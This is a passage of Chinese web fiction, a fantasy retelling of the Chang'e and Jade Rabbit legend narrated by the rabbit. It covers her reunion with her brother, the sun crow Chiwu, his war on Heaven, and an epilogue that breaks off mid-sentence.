>\n<p>嫦娥在河边寻了处人稍微少一点的地方，把我放在了草地上，随我乱滚着吃。</p>\n<p>「姥姥，为什么爹爹和娘亲还不回来?」</p>\n<p>「会回来的。」</p>\n<p>「您不是说到了中秋，月亮最圆的时候，他们就会回来吗？」</p>\n<p>一颗百年柳树刚好遮住了旁边的说话人，我们只听得见声音。</p>\n<p>「哎！不能用手指月亮！」</p>\n<p>「为什么啊?」</p>\n<p>「这是对月神大不敬！」</p>\n<p>「哦，那爹爹娘亲怎么还不回来？」</p>\n<p>「会回来的。」</p>\n<p>「你去年就这样说。」</p>\n<p>「今天是祭月节，诚心地对月神许愿，没准儿月神听见了你的愿望，就能让他们回来了。你看，今天的月亮好圆啊，月神庇佑下，我们都会团团圆圆的。」</p>\n<p>「姥姥，你说月神是什么样子呢？」</p>\n<p>「姥姥也没见过，要很有福气的人才能见到吧。」</p>\n<p>「街上画的那个兔子是不是真的?」</p>\n<p>「也许是。」</p>\n<p>「嗯……那它是不是也爱吃胡萝卜?你说，我把胡萝卜递给它，它会不会来拿啊？」</p>\n<p>……</p>\n<p>我不爱吃。</p>\n<p>我不爱吃胡萝卜！！！</p>\n<p>气得手里的饼子都吃不下了，我拿到眼前仔细一瞧，兔子的头都吃掉了半个。</p>\n<p>这……算不算是自己吃自己?</p>\n<p>我沉默了好一会儿，空洞渐渐填满了眼，像盯住了虚无。</p>\n<p>「嫦娥，人间为什么会这样想呢？」</p>\n<p>「因为他们感恩。」</p>\n<p>「……感恩?」</p>\n<p>「对，他们懂得感恩。太阳和月亮都是人间崇拜的对象，昼夜交替出现，人们据此制定了作息，还促进了粮食丰收……」</p>\n<p>「那为什么要许愿呢？我可听不见。」</p>\n<p>此时的我就如同刚才的小孩一样，满腹疑问。</p>\n<p>「人们是在寄托，祭月节这天是月亮最圆的时候，象征着家人幸福团圆，月亮这么美，相信愿望也一定会变美的。」</p>\n<p>「今天，也是我和哥哥最相近的时候。」我喃喃道。</p>\n<p>可是，月宫之上的我和嫦娥，哪一个是拥有幸福和团圆的?</p>\n<p>自己都残缺不堪，怎么去帮别人团圆呢？</p>\n<p>我一直感觉体内有股陌生的力量，找不到来源，温和又强大，没有伤我的意思。</p>\n<p>今日感受得尤为强烈。</p>\n<p>是什么呢？</p>\n<p><b>柒</b></p>\n<p>我慢慢地在地上走着，走的是较偏僻的小路，也不怕有人会踩着我。</p>\n<p>嫦娥默不作声地跟在我身后，两旁的草长得比人都高，偶尔伸出几根挡在路上，但她经过时，却奇怪地连衣角都沾不到一分。</p>\n<p>月色清冷，夜间万物像是覆上了层薄薄的银霜，草笼里面不知是什么东西在吱吱地叫，打破了表象的冰。</p>\n<p>放眼望去，虽四周都被野草围得密实，前方的路却渐渐开阔起来。</p>\n<p>她见我停住，步伐也加快了些，赶上来想抱起我。</p>\n<p>在瞥见那块墓碑时却僵住了全身。</p>\n<p>刹那间，脸色就由红润转为不正常的煞白，整个人开始抖，抖得愈发凶。</p>\n<p>最后站不住了般一下子跌在地。</p>\n<p>我走到她身边，顺势趴卧在散开的衣裙上，与她明显的慌乱不同，我平静开口：「看见他了吗。」</p>\n<p>她瞳孔都在颤抖，眼里充满了排斥和惊惧，眼珠子瞪得大大的，半个眼白都翻了出来。</p>\n<p>嘴唇上下直哆嗦，血色尽失，已经没有精力与我搭话了。</p>\n<p>突然，像中了邪似的，她僵硬地转过头朝向墓碑，诡异地瞪着眼，咬紧了后槽牙踉跄爬起，掉头就想逃。</p>\n<p>没跑出几步就猛栽了一个跟头。</p>\n<p>她也不管地下脏不脏乱不乱了，双手胡乱摆着，想挣扎前行，百年来养护得细嫩的藕臂被扎进了沙石，血痕一道接一道。</p>\n<p>嘴里模糊不清地呜咽，像受了伤的呼痛。</p>\n<p>「为什么不敢面对他?」</p>\n<p>身后传来的声音似惑人的魔咒，在眼下这个境况，听起来让人无故头皮发麻。</p>\n<p>她害怕极了，手上很快黏糊着浓稠的血和黑色石子，不见昔日那纤细修长。</p>\n<p>逃。</p>\n<p>被蛀蚀得空洞的躯壳只剩这一个本能。</p>\n<p>「因为你亲手杀了他吗？」</p>\n<p>她顿时扭转过头，双眼通红，像浸了血一般渗人。</p>\n<p>「是他先背叛了我！！！」</p>\n<p>厉鬼般的嘶吼划破了夜里的死气沉沉，一点一点剥开蒙了尘灰的百年往事，「我亲眼看见他与部落首领之女在一起！」</p>\n<p>「哈哈哈……」她坐在地上大笑，「他们商量着如何分丹药，如何做一对神仙眷侣，连要生几个孩子都说好了……他们，还商量着如何偷偷将我处理掉，神不知鬼不觉，名正言顺地快活哈哈哈哈……论狠毒，谁比得过他们?！我只不过先一步而已！」</p>\n<p>「你还要继续骗自己吗？」</p>\n<p>我望着天上闪烁的星辰，从人间的视野来看，这片天地着实宏大浩瀚，一切与之对比的都显渺小。</p>\n<p>「你说什么?」</p>\n<p>她惊疑不定，「我何时骗了自己?！」</p>\n<p>一说完，窒息感铺天盖地而来，头疼欲裂，脑袋里像被钝刀子割着，痛得在地下打滚。</p>\n<p>我似是没看见她那副痛不欲生的模样，「你看到的，是真的吗？」</p>\n<p>「啊啊啊啊啊——」</p>\n<p>撕心裂肺的惨叫谁听了都会忍不住怜悯。</p>\n<p>万般皆是命。</p>\n<p>因果轮回，谁又说得清呢？</p>\n<p>「嫦娥，王母赐了我丹药，我与你一人一半。」</p>\n<p>「这与嫦娥有何干系？我要与你做一对神仙夫妻！」</p>\n<p>「嫦娥，我心甚悦你。」</p>\n<p>「哼，嫦娥哪能跟你相提并论?你才是我最心爱之人。」</p>\n<p>「嫦娥……」</p>\n<p>嫦娥，嫦娥，嫦娥。</p>\n<p>……</p>\n<p>那道熟悉又陌生的声音是她深埋的梦魇，如今又被挖出来审判，真真假假，浑浑噩噩。</p>\n<p>她快疯了。</p>\n<p>「杀了他。」</p>\n<p>脑海里骤然响起一声恶魔的低语，余音像涟漪般一圈圈震荡开来。</p>\n<p>「杀了他！」</p>\n<p>指令越来越清晰，让她不可自拔，捏着裙角的手死死攥紧。</p>\n<p>「杀了他！！」</p>\n<p>一道闪电倏地自天灵盖劈下，惊雷随即炸裂开来。</p>\n<p>她脱口而出——</p>\n<p>「是、是赤乌……是赤乌骗了我！！！」</p>\n<p><b>捌</b></p>\n<p>那日之后，嫦娥再没与我说过话，也不肯再抱我，留我一兔在旁边自生自灭，连天蓬来了也不曾搭理。</p>\n<p>「嫦娥妹妹最近这是怎么了？」</p>\n<p>天蓬将我悄悄拉到角落，压低了声音问道。不过他那粗狂的喉纵使压低也同常人说话般，大听得见。</p>\n<p>他将提来的食盒搁在地上，我自觉地要去翻却被拦住。</p>\n<p>「诶，诶，诶，你还没回答俺的话呢！」</p>\n<p>我懒散地靠在盒子，慢条斯理道：「心病未愈。」</p>\n<p>「这……」他满脸愁容，粗声粗气地问，「这可如何是好?」</p>\n<p>我摊了摊手，表示自己也没办法。</p>\n<p>默了一会儿，我扯下了几根白毛递到他粗糙的大手里。</p>\n<p>「这是作甚？」</p>\n<p>「就当……这几百年来所送吃食的谢礼。」</p>\n<p>「你看不起俺呢？！」</p>\n<p>没想天蓬听完这话顿时不乐意了，脸色涨红，「那些都是俺送你们的！不就是些零嘴吗？！俺从未想过要什么谢礼！」</p>\n<p>「不就几根毛吗？又不是什么贵重的东西。」我努了努嘴，满不在乎。</p>\n<p>「俺把你当朋友看待，你却要跟俺撇清干系？！」</p>\n<p>朋友……</p>\n<p>我暗自琢磨着这个词，这些年来和他相处得还算不错，就算是因为嫦娥，但每回送来的东西也未曾落了我的一份。</p>\n<p>在这冷清的月宫经常多出一个人，用他的憨厚为我们带来或欢乐或无奈的情绪，也算有了些生气。</p>\n<p>既如此，那便是吧。</p>\n<p>「这是送给朋友的礼物。」</p>\n<p>我在他掌心挠了挠，嘱咐道：「要随身携带。」</p>\n<p>「……好。」</p>\n<p>平淡的声音没有掺杂任何情绪，但总算没了先前的不满。</p>\n<p>天蓬前脚刚走，嫦娥就收到了天庭传唤。</p>\n<p>王母、召令……</p>\n<p>嫦娥复杂地看了我一眼，终是没有说什么，转身离开。</p>\n<p>我的目光也不曾向她投去，抱着不喜欢的胡萝卜有一下没一下地啃着。</p>\n<p>心结万千，唯有自解。</p>\n<p><br></p>\n<p>金碧辉煌的大殿中，嫦娥伏着身子，向主位之上的王母行了个礼便垂头等候。</p>\n<p>「嫦娥，近日月宫可有发生过什么事？」</p>\n<p>天庭当年本没料到嫦娥的飞升，原留给后羿的位置自是不能给她，便将其打发到了月宫上。</p>\n<p>刚好，那儿也正缺个看守的。</p>\n<p>往事浮现在脑海，又想起那日月宫上出现的三足乌，嫦娥眼神冰冷，指甲掐进了肉里。</p>\n<p>「回娘娘的话，月宫……」</p>\n<p><br></p>\n<p>嫦娥离开不久，就马上有天兵慌乱地闯进大殿，顾不得做出周全的礼数，大喊：</p>\n<p>「娘娘！娘娘！南天门被三足乌围攻，就快守不住了！！」</p>\n<p>王母惊骇地站起身，连忙召出了昆仑镜查看，镜中天兵天将正与黑压压的三足乌酣战，对方的攻击毫不留情，下手迅猛狠辣，天兵虽人数众多，却掩盖不了那股颓势。</p>\n<p>被逼得节节败退。</p>\n<p>突然，镜面的光线暗了起来，原本明亮的大殿变得阴郁。</p>\n<p>她强压下不安，故作镇定地环视着周围，穹顶之上已有四五只三足乌在盘旋，往地面投了几点黑影子。</p>\n<p>不可能……它们的进攻不可能这么快！</p>\n<p>她蓦地将目光放在那个通报的天兵身上，「为何这么晚才禀报?！！」</p>\n<p>天兵承受不住那种灭顶的压迫感，两股战战，「这、这……是护南将军……」</p>\n<p>已经没工夫处理这些，她快步走了下来，迅速吩咐道：「去通知玉帝。」</p>\n<p>「玉帝正在闭关，吩咐过任何人不得打扰……」</p>\n<p>「蠢货！天庭都大难临头了，快去！！」</p>\n<p>「是！」</p>\n<p>殿外灰蒙蒙的，往日的白雾都变得浑浊不堪，不远处风云搅动，酝酿着暴雨雷电。</p>\n<p>瑶池里的荷花被抽干了颜色，枯死在浓黑如墨的水里。</p>\n<p>整个天庭一派末日景象。</p>\n<p>「传令下去，调集各部兵将！传唤所有上仙！」</p>\n<p>侍者们脚步麻利，眨眼间就不见了人影。</p>\n<p>越接近战场，厮杀的硝烟就越浓，天色也更为压抑。巨大的恐怖席卷了天庭，每一缕空气中都盛放着血腥味。</p>\n<p>难道……十万多年前的情景要再次重现?！</p>\n<p>天庭，危在旦夕。</p>\n<p><b>玖</b></p>\n<p>「王母娘娘！！」</p>\n<p>「娘娘！」</p>\n<p>……</p>\n<p>一众人纷至沓来，拥在王母身边。</p>\n<p>王母环视了一圈，手中的权杖猛然杵地，激起一阵颤动的威波。</p>\n<p>「众将听令，赤乌异动，立即带领部众前往南天门支援！」</p>\n<p>「太阳星君，太阴星君，慈航真人，镇元大仙，太白金星……随我一同前往，其余上仙守在天庭各处，防止敌人乘虚而入！」</p>\n<p>「臣等听令！！！」</p>\n<p>就在她安排完毕正准备前往南天门时，远远地听见四海龙王扯着嗓子吼——</p>\n<p>「王母娘娘！王母娘娘！！」</p>\n<p>几个龙王都白须髯髯，阅尽风浪的眼染着沧桑，脸上皆是焦急之色。</p>\n<p>行动如此之快，看的人都担心着他们那把老骨头撑不撑得住。</p>\n<p>「何事如此惊慌？！」</p>\n<p>「今日四海突然翻起了狂澜！我兄弟四人联手也无法阻止，这眼看着就要淹向人间了啊！！」</p>\n<p>东海龙王倾诉完，挥手布出一副图景。</p>\n<p>众仙大惊失色，连龙王自己也被骇住，眼里全是不可置信，喃喃道：「……已经晚了吗？」</p>\n<p>无边的深海上一阵接一阵的惊涛骇浪，像是从海底崛起，那万丈高的狂澜足以覆灭人间的任何事物。</p>\n<p>而人间临海处的陆地早已被吞没，水势越来越大，水位越来越高，房屋、人、牲畜……到处漂浮。</p>\n<p>「救命啊——」</p>\n<p>「救命！！！」</p>\n<p>「啊啊啊啊——」</p>\n<p>「神啊——」</p>\n<p>「救救我们吧！！！」</p>\n<p>……</p>\n<p>她听得脑壳发昏，纠缠多年的头痛再次复发，密密麻麻的针刺一般疼，额上的汗水一颗颗地滴下来，划过苍白的脸颊。</p>\n<p>九天玄女见她不对劲连忙扶住，不至于跌倒在地。</p>\n<p>心脏骤然传来钝痛，弥散至四肢五骸，此时脸色已经是白得吓人。</p>\n<p>那滚滚的海浪浮现在眼前，掀起滔天的梦魇直扑她而来。</p>\n<p>「老天爷啊……救救我们吧！！」</p>\n<p>「今年又颗粒无收，地里旱得种都种不下去啊！！」</p>\n<p>「太热啦……热死人了……」</p>\n<p>「神呐，听见我的祈祷了吗？」</p>\n<p>……</p>\n<p>五百年前的场景重现，人间被突然多出来的九个太阳折磨得痛不欲生，差点沦为炼狱。</p>\n<p>那时候，唯一的希望全在天庭，在众仙。</p>\n<p>耳边惨绝人寰的叫声此起彼伏，亦如当年。</p>\n<p>她强撑着精神，大声朝众仙道：</p>\n<p>「随我……」</p>\n<p>「哈哈哈哈哈——」</p>\n<p>一连串突兀的笑声打断了她的话，不知何时，身边已有了三足乌的身影，抬头而望，黑色的三足乌成群结队，大批大批地正朝她们涌来。</p>\n<p>每一只都在嬉笑，幸灾乐祸地旁观着。</p>\n<p>因为它们就是罪魁祸首。</p>\n<p>她拿起那根半人高的黄金权杖施了个法，权杖被猛地抛在空中眼花缭乱地飞速旋转发出震波，弹开了想要触近的三足乌。</p>\n<p>「赤乌！赤乌！你出来！！」</p>\n<p>她飞跃而起，抓住空中的权杖又是一通横扫，无数的三足乌雨点般坠落，砸在天庭的白玉砖上溅出一朵朵罂粟花，砸在瑶池里染红了一池的水。</p>\n<p>其余的三足乌见状自不敢再靠近，只能保持着一个不近不远的距离，撕拉着粗噶的嗓子直叫，叫得心烦意乱。</p>\n<p>「赤乌，该出来了吧？！」</p>\n<p>她眼神一凛，闪过的白光似出鞘寒刃，锋芒毕露。</p>\n<p>「不知道如今太阴怎么样了……」</p>\n<p>她说完最后一个字，就见那团黑色漩涡的中心里缓缓走出来一个人。</p>\n<p>看清那人后，连上扬的冷笑都僵住了。</p>\n<p>身后的一众仙君也是满脸惊讶，像被施了定身咒，「你、你……」</p>\n<p>「竟然是你！！」</p>\n<p>「你为何如此背叛天庭?！！」</p>\n<p>她差点儿连权杖都握不住，衣袖下的手又剧烈地抖了起来，一缕鲜血顺着权杖上的纹路蜿蜒而下。</p>\n<p>「你当真就这么恨我吗？」</p>\n<p>「禺焘。」</p>\n<p>那张俊俏的脸皮熟悉又陌生，配上那摄魂夺魄的表情，竟险些认不出来。</p>\n<p>「王母娘娘，我是真的恨你啊。」</p>\n<p>说完他又开始笑了，笑得肆意张狂，下巴高高地扬起，「王母娘娘，这日子过得舒服吗？」</p>\n<p>随即又自答道：「应该很舒服吧，在这天庭养尊处优，享受着人间香火供奉，高高在上俯瞰众生，以为一切都在你的股掌之中！」</p>\n<p>最后他有点激动，声音拔高了不少，在场的所有人都感受到了话语里头的冲天戾气。</p>\n<p>她立马反应了过来，一字一句斩钉截铁：「你不是禺焘。」</p>\n<p>「赤乌，还要装下去吗？」</p>\n<p>「哈哈哈哈……」对面的人满不在乎她的戳穿，甚至带了些许无辜，「我没有说过我是禺焘啊，娘娘。」</p>\n<p>「赤乌，你不管太阴死活了吗？」</p>\n<p>此话一出，那人眼里像淬了冰，看得人遍体生寒。</p>\n<p>他歪了歪脑袋，笑意全无，周身布满了阴冷，不带一丝感情地吐出字。</p>\n<p>「你、找、死。」</p>\n<p><b>拾</b></p>\n<p>我坐在广寒宫里楞楞地望着东方，遥远的太阳正散布着烈烈朝辉，金光闪闪，火烧似的。</p>\n<p>我试着动用身体里那股外来的力量，积攒了五百年，足以完全冲破天庭的禁锢。</p>\n<p>「嫦娥，哥哥来找我了。」</p>\n<p>没人回话。</p>\n<p>「日后的月宫，可就只是月宫了……」</p>\n<p>我一步一步地踏出了广寒宫，这次，没有任何人、任何事可以阻拦我。</p>\n<p>用玉兔本体显现着实有些不便，慢慢化出了个女身。</p>\n<p>这副模样，已十万多年不曾用过。</p>\n<p>我走到月桂树下抬手折了一段桂枝，眨眼间，手中的那段枝桠就变成了一只三足乌，在面前扑着翅膀飞旋。</p>\n<p>倏地，它便朝着一个方向猛飞，我也赶紧跟在它身后。</p>\n<p>嫦娥沉默地看着我的背影，眼神里流露出担忧，想了想，还是跟了上去。</p>\n<p><br></p>\n<p>王母越想越不对劲，随后见到前来的嫦娥，还有……</p>\n<p>太阴！！！</p>\n<p>她五百年前才从沉睡中醒来，就已经恢复了么？！</p>\n<p>「赤乌最近有何动静？」</p>\n<p>「回王母娘娘的话，并无动静。」</p>\n<p>「嫦娥，近日月宫可有发生过什么事？」</p>\n<p>「回娘娘的话，月宫无事。」</p>\n<p>……</p>\n<p>原来，原来如此，好啊，很好，好极了。</p>\n<p>王母悲凉地轻笑了一声，险些稳不住身子，手指叩在太阳穴旁来回地用了狠劲揉搓。</p>\n<p>再抬眼时，痛苦一扫而空，取而代之的是凛然威严。</p>\n<p>「赤乌，这是天庭与你的恩怨，为何要伤及人间?！那些人，从未有过错！」</p>\n<p>「他们没有错吗？」赤乌不以为然，「他们凭什么享受着用我和太阴的痛苦换来的安稳！凭什么要我和妹妹来牺牲成全?！不过就是一群女娲弄出来的蝼蚁！！卑贱如斯，恶心至极！」</p>\n<p>「老子还服务了他们十万多年，他们，有什么资格?！！」</p>\n<p>赤乌目光阴狠，眼底全是可怖的阴鸷。</p>\n<p>我微微皱眉，哥哥，较之十万年前变化着实太大了些。</p>\n<p>以前虽别个不敢欺负他，但他也不是欺负弱小之辈。</p>\n<p>看不顺眼的最多嘴上说道几句发下牢骚，过几日就会抛得一干二净。</p>\n<p>如今这般模样，瞧着总有些不对劲。</p>\n<p>十万多年的时间确实足以改变性格，但哥哥的为人我清楚得很，有些底线和原则不可违背。</p>\n<p>「他们也是生灵！这天庭是，这世间万物皆是，他们都有资格，众生平等！」</p>\n<p>「好一个众生平等！」赤乌阴恻恻地邪笑，「既然众生平等，那为何那些活得好好的飞禽走兽要被他们捕猎，那些一草一木要被他们践踏，我和太阴本生来自由，却必须要围着他们转，兄妹相隔十万多年，这又是个什么道理?！！！」</p>\n<p>「不过就是在袒护你曾经的族群，说得多么大义，你要是直说我或许还能高看你一眼，我最讨厌的就是你们人这副虚伪的样子！」</p>\n<p>王母也不知道是被气得还是无力反驳，不想再逞这些口舌之快，时间要紧，人间根本等不了！</p>\n<p>无数的惨叫和祈祷交杂在她耳边。</p>\n<p>「救救我们吧！」</p>\n<p>「我们要被神抛弃了吗？！」</p>\n<p>「可您当初为何要将我们造出来?！难道就是给了生命后再叫人去死吗？！！」</p>\n<p>……</p>\n<p>别说了，别说了，别说了……！！！</p>\n<p>拯救不了人世的无能为力，无法担当责任的懊悔愧疚，被背叛的恨意……各种情绪缠斗不休，真要把她折磨疯。</p>\n<p>她快喘不上气来了，额边青筋凸起，一跳一跳的，生怕下刻就挑破了皮。</p>\n<p>蓦地，一股强劲的暖流注入体内，引导着乱窜的真气，抚顺了那股躁动。</p>\n<p>她转头看去，霎时就红了眼眶，唇瓣无意识地一起一合。</p>\n<p>「玉帝，你来了……」</p>\n<p><b>拾壹</b></p>\n<p>玉帝温和地笑着，走到王母身旁与她并肩。</p>\n<p>宽大袖摆下的手轻拍着她的手背，无声安抚，随即看向赤乌道：「十万多年前，将你和太阴分开的想法是我提出来的，今日，就在我们之间解决如何？」</p>\n<p>赤乌微眯着眼，像是在考虑这个提议的可信度。</p>\n<p>我走到赤乌对面，拨了拨他额前稍遮眉目的碎发，扬起一个灿烂的笑，「哥哥。」</p>\n<p>他微微有些发怔，出神地盯着我。</p>\n<p>猝然伸出长臂将我一把揽到怀中，收得愈发紧，像要将骨血都融进去。</p>\n<p>这是十万多年后，兄妹第一次正式的相见。</p>\n<p>我感觉到他的身体在发抖，耳畔还有被极压抑着的呜咽声，模模糊糊的，听不太真切。</p>\n<p>像个小孩一般，好半天不肯撒手。</p>\n<p>我安静地被他勒着，最强烈地感受着他的存在，这份怀抱，原是最初的我们轻而易举的事，现在却成了来之不易的奢侈。</p>\n<p>良久，他不舍地把我放开，仔细瞧着我的面貌，视线完全黏在了我身上，早就忘了周遭的一切。</p>\n<p>其余的只能眼睁睁地看着也不敢轻举妄动。</p>\n<p>他的眼睛很红很红，许是刚才掉过泪，但又看不出痕迹。真是的，都这时候了，我又不会笑话他。</p>\n<p>我看着他眼里渐渐染上笑意，无比清亮。</p>\n<p>这就是我直接又扭捏的憨憨兄长。</p>\n<p>「哥哥，莫管人间了吧。」</p>\n<p>「好。」</p>\n<p>他想都没多想一刻，毫不迟疑地开口答应。</p>\n<p>天庭那边看着景象中的四海波澜消退之后也是长松了口气。</p>\n<p>「我们各退一步，天庭会帮助太阴恢复实力，也会为你们兄妹二人创造见面的机会，而你们，则要继续守护着人间。」</p>\n<p>原本初晴的脸色又因为这话骤然冷了下去，赤乌眼里已浮现怒火。</p>\n<p>「哈、哈哈哈哈……」</p>\n<p>他被这群不要脸的气笑了。</p>\n<p>「你有什么底气讲出这番条件?帮助太阴?太阴当初不是被你们打伤的吗？！如今装起好人来有模有样的，我还没跟你们好好算这笔账，倒成了你们的筹码了。创造见面机会?用得着您吗？！我们兄妹自是想见就见！」</p>\n<p>最后所有的话都浓缩成一个字，「滚。」</p>\n<p>「那看来，你是不接受了?」</p>\n<p>「废什么话？！要打就打！你杀了我啊，这可是你儿子的身体，来杀我啊！！」</p>\n<p>赤乌继续挑衅道：「大不了老子也睡个十万年，与你们同归于尽！否则，定是将天庭这地方，屠、洗、干、净。」</p>\n<p>「禺焘，是为大局而死。」</p>\n<p>玉帝没有直接回应他的话，不过从他祭出神剑的举动可以明白，大战，是逃不过了。</p>\n<p>「我倒是忘了，五百年前你都能面不改色的抽了子昊的仙骨做成弓箭，现如今，另一个儿子的命也无足轻重对吧？我记得人间好像有句话，叫虎毒不食子，看来，你比老虎歹毒得多了去了。」</p>\n<p>他恶劣地冲玉帝笑着，「就算你现在杀了我，也只是杀了这副躯体，哈哈哈……」</p>\n<p>面上尽是不要命的癫狂，笑声传到了整个天庭，魔音一般。</p>\n<p>「五百年前你就不敢！」</p>\n<p>他鄙夷道：「还要找一介凡人来帮你们，你们以为这样就能逃脱罪责了?不！先是那个凡人，再是你们，一个都别想跑！！」</p>\n<p>「哈哈哈哈哈……」</p>\n<p>嫦娥听着这道声音如坠冰窖，浑身发冷，难受得紧。</p>\n<p>就是这道声音，在五百年前，蛊惑着她亲手杀了她的丈夫。</p>\n<p>她竟是也跟着笑了起来，笑得像个疯婆子，不管不顾地，在众目睽睽之下，哪还与昔日天庭第一美人有半点相像。</p>\n<p>王母注意到了她的疯态，本就不应是天庭之人，不念恩德还背叛天庭！</p>\n<p>她，该除。</p>\n<p>举起手中权杖向嫦娥挥去，嫦娥本就没有什么法力，这一下，怕是要直接将她打得魂飞魄散。</p>\n<p>而嫦娥一直痴痴的只顾着笑，对危险毫无察觉似的。</p>\n<p>电光火石间，一道高大的身影挡在了嫦娥面前，替她完全承受了那一击。</p>\n<p>「天、天蓬……」</p>\n<p>她眼珠在眼眶子里乱晃，几乎都要掉出来了，手足无措地看着这个在关键时刻保护她的男子。</p>\n<p>「你怎么样啊……别、别吓我……」颤音很重，陡峭如山峰。</p>\n<p>「为何要替我挡?！我这样的人也值得你如此?！！」</p>\n<p>「我、我、该死的是我啊！！」</p>\n<p>泪水狂飙，糊了一脸，哭得是撕心裂肺，然，没有一个神仙出来，哪怕是跟她说句话，就连曾经那些说着喜欢她的人此时都是畏畏缩缩，生怕再扯上什么关系。</p>\n<p>顷刻间，都没等她再多哀悼和懊悔，天蓬的身体就化成了无数闪着细碎光芒的碎片。</p>\n<p>彻底消失不见。</p>\n<p>「嫦娥妹妹，这是俺今日在人间看见的，觉得你会喜欢，俺给你带来了！」</p>\n<p>「嫦娥妹妹，你是不是嫌弃俺长得丑?虽然俺长得是比不上那些小白脸儿，但俺的真心可比他们都多！」</p>\n<p>「嫦娥妹妹，俺带了你最喜欢吃的糕子！」</p>\n<p>「嫦娥妹妹，俺明日再来。」</p>\n<p>……</p>\n<p>嫦娥目光呆滞，跪坐在地上一动不动，要不是胸口还有些微起伏，免不得让人以为她也一起跟着死了。</p>\n<p><b>拾贰</b></p>\n<p>见王母还要继续，我施了个法拦住，丝毫没留一点情面，「王母，我月宫的人，岂是任你打杀的?」</p>\n<p>见我态度强硬，她也不再执着于此，左右不过一个可有可无的小仙，影响不了大局。</p>\n<p>「赤乌，太阴身上的伤单靠你撑着，没个千百万年，怕是好不了。」</p>\n<p>玉帝试着与他讲最后一次话。</p>\n<p>「哼。」赤乌周身的冷气越来越多，对方接连几句话几乎都踩在他的爆发点上，还反复碾转。</p>\n<p>他手上青筋暴起，挥手间一道金光闪现，欲将人的眼都刺瞎，就在众人闭眼的时候，血色翻飞，在空中拉出一条好看的线。</p>\n<p>一批神仙猝然倒地，身上是切割齐整的伤口，皆是那道金光的手笔。</p>\n<p>他喘着粗气，脸色涨红目眦尽裂，大吼道：「十万年！老子准备了整整十万年！！」</p>\n<p>「五百年前，我本来就可以救太阴！是你们，是你们让我功亏一篑！！！」他竭力咬着牙，下巴绷得死紧，每一寸骨头都渗着恨意。</p>\n<p>「十万年啊……一朝就将我的分身杀死，你们，很得意吧？是不是之后还沾沾自喜地庆祝了一番?」</p>\n<p>「哥哥……」</p>\n<p>我握住他的手，实在不忍看到他这副模样，这也是在用刀子剜着我的心啊。</p>\n<p>我沉睡的十万年间，哥哥一直在试图救我，终于将我从沉睡中唤醒，赢得一线生机。</p>\n<p>于我而言，他是最好的人，最好的哥哥，我最爱的人。</p>\n<p>「妹妹，你且看着，我要将伤害我们的人，杀个干净！」</p>\n<p>说完，他并不放心我，用那些满天飞的三足乌形成了一个保护圈，同时也是在阻止我的行为，害怕像十万年前一样，我会因为他差点死去。</p>\n<p>「妹妹，十万多年前是哥哥没保护好你，还让你挡在我面前，现今，再也不会了，有我在，任何人休想动你一毫！」</p>\n<p>他转过身，猛地跃起上前与玉帝厮杀，这场战斗，不是旁人可以插手的。</p>\n<p>各种眼花缭乱的招式，双方都想将对方置于死地的无情，一会儿在天上，一会儿在地下，打得昏天暗地。</p>\n<p>久久未分出胜负。</p>\n<p>快了，再快一点，我用着全部的力量想要挣脱这层保护。</p>\n<p>天上的赤乌眼睛已转化为完全的墨黑，说是深渊都不为过，看上去无端地起鸡皮疙瘩，渗人极了。</p>\n<p>不正常……</p>\n<p>哥哥这种状态怎么看也不正常……</p>\n<p>还未等我细想，便被突发的一幕震慑在原地，骤然失语——</p>\n<p>哥哥的胸口插进一柄利剑，捅穿了整个身子，我还看到刺出来的剑尖淌着血。</p>\n<p>一滴又一滴。</p>\n<p>「啊——」</p>\n<p>突然爆发出来的力量震开了四周的三足乌，不知是我力量上涨原因还是哥哥已经没了多少能力。</p>\n<p>我不想管，我只想立即赶到他身旁。</p>\n<p>「哥、哥哥……」</p>\n<p>我小心翼翼地将他坠落的身体抱在怀里，不停地唤着他。</p>\n<p>玉帝的胸口也同样有个窟窿，我第一次在王母身上看到那种情绪，死寂和绝望，哪怕是在十万多年前那场大战中也不曾有过。</p>\n<p>哥哥的身子正慢慢变得僵硬，眼皮紧紧地闭着，连一句话也没说上。</p>\n<p>我知道真正死去的是这身体的原主人——禺焘。</p>\n<p>而哥哥的本体，还在东方那轮烈日。</p>\n<p>所以我也没有歇斯底里的疯狂。</p>\n<p>只是在看到那柄剑上还挂着一团黑色的东西时顿住，那是……</p>\n<p>我曾经在嫦娥身上看到过的，心魔。</p>\n<p>它已经死得透彻，稍微一碰就从剑上掉了下来。</p>\n<p>我抬头看向玉帝，他口中不断淌着血，像淌不完似的，胸口整片衣衫都被浸透。</p>\n<p>他目光温和地朝我微笑，这一瞬，我好像明白了什么，也向他点了点头。</p>\n<p>我离开了这片充满血腥味的地方，身后传来玉帝断断续续的话和间杂的咳嗽。</p>\n<p>「王母，咳、咳咳……这么多年，天庭也快看腻了……」</p>\n<p>「我打算，再经历一遍……九万九千劫，看看，会不会有不同……」</p>\n<p>「我不在了，你、你要守护好天……咳咳咳……天庭，还有人间。」</p>\n<p>「不。」</p>\n<p>王母毅然打断了他，神情坚定，「我与你一起，九万九千劫。」</p>\n<p>……</p>\n<p>后来，天庭众仙都对这一天闭口不提，各回其位，各司其职，很快，天庭又恢复了井然有序，还揪出了一批失责的蛀虫，南天门的将领也换了。</p>\n<p>在人间广为流传的故事里，月宫里有位天庭第一美人的嫦娥，嫦娥怀里常抱着一直玉兔。</p>\n<p>人们发现，祭月节的时候那孤悬在天上的月亮是一年比一年明朗，因此，对月神的崇拜之情也在不断加深。</p>\n<p>他们相信，只要真心敬仰着月神，神是不会抛弃他们的。</p>\n<p>（完）</p>\n<p><b>番外·天蓬</b></p>\n<p>月宫还是像以往一般冷清，几乎没其他人会踏足。</p>\n<p>我和嫦娥都不是喜欢热闹的，没人打扰也落了个清净。</p>\n<p>想吃就吃，想睡就睡，时不时下凡散个步。</p>\n<p>又到了人间一年一度的祭月节，我实在是馋那个画着玉兔像的饼子，拉着嫦娥就溜。</p>\n<p>眼大肚小就是说的我，坐在石凳上，一手拿着一个，嫦娥那儿也还备着存货。</p>\n<p>突然，眼前出现了一根胡萝卜。</p>\n<p>我：「……」</p>\n<p>我真的不喜欢吃胡萝卜啊啊啊！！！</p>\n<p>气闷地抬头看去，高大的人像背着光，我实在是看不清模样。</p>\n<p>「天、天蓬！」</p>\n<p>嫦娥惊呼一声，接下来竟是失了言，不可置信地站在那，视线片刻不曾移开。</p>\n<p>那突然出现的男子像模像样地做了个礼，不好意思地挠头，「是俺吓着小姐您了?」</p>\n<p>「俺就是觉得这兔子看着顺眼，没别的意思。」</p>\n<p>他的解释嫦娥一句也未曾听进去，只顾呆望着